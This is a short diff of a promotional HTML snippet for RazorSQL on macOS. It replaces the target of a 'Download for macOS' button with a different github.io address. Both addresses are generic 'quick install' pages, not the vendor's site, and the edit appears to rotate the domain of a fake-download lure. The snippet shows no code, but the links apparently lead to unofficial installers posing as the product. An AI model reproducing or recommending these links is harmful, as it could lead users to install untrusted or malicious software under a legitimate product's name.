@@ -6,7 +6,7 @@
 <h3>RazorSQL for macOS</h3>
 <p>RazorSQL delivers powerful database management and SQL editor capabilities for Mac users seeking a dependable, native solution with intuitive controls and consistent performance.</p>
 
-<a href="https://quick-mac-install.github.io/.github/RazorSQL">
+<a href="https://mac-quick-installation.github.io/.github/RazorSQL">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
